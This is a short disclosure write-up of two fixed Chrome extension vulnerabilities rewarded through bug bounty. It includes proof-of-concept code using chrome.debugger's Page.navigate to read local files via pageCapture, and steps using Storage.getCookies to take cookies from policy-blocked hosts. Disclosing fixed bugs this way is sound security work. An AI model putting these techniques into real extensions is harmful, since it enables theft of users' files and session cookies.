title: Abusing the chrome.debugger extension API
---

The chrome extension `chrome.debugger` <https://developer.chrome.com/docs/extensions/reference/api/debugger> API implies `<all_urls>` permission but should not grant access to the users file system or bypass enterprise policies.  
However its a very powerful by design with lots of features <https://chromedevtools.github.io/devtools-protocol/>

# 'Page.navigate' could navigate iframes to file:// when not enabled (Awarded $3000)

Extensions with both `pageCapture` and `debugger` permissions could read local file contents.
This is because its possible to use `Page.navigate` to navigate an iframe to `file://` when "Allow access to file URLs" is disabled exposing the files contents to the `pageCapture` API.

```js
chrome.debugger.attach({tabId: <TARGET>}, '1.3', console.log);
chrome.debugger.sendCommand({tabId: <TARGET>}, 'Page.navigate', {frameId: <FRAME ID AS SEEN FROM EVENTS), url: 'file:///d:/demo.txt'}, console.log);
chrome.pageCapture.saveAsMHTML({tabId: 800972627}, console.log);
```

This issue was fixed in <https://issues.chromium.org/40060173>

# Features bypass the runtime_blocked_hosts cookie protection (Awarded $3000)

Extensions where able to get cookies from a runtime_blocked_host using the chrome.debugger API via `Storage.getCookies` <https://chromedevtools.github.io/devtools-protocol/tot/Storage/#method-getCookies> and other protocol features.

## Setup

- Add host to runtime_blocked_hosts <https://chromeenterprise.google/policies/?policy=ExtensionSettings>
- For windows 10 using registry at `HKEY_CURRENT_USER\SOFTWARE\Policies\Google\Chrome` create string with name `ExtensionSettings` and content of `{ "*": { "runtime_blocked_hosts": [ "*://example.org" ] } }`
- Policy should be listed at `chrome://policy/` may need to reload.
- Create cookie at <https://example.org> like `document.cookie = 'foo=foo';`

## Exploit

Using a browser extension with the debugger permission.

- Get `tabId` like with `chrome.tabs.query({active: true});`
- Attach to a tab with `await chrome.debugger.attach(target, '1.3');`
- Run `Storage.getCookies` with `await chrome.debugger.sendCommand({tabId: <tabId>}, 'Storage.getCookies');` it should contain the cookie from the runtime blocked host.
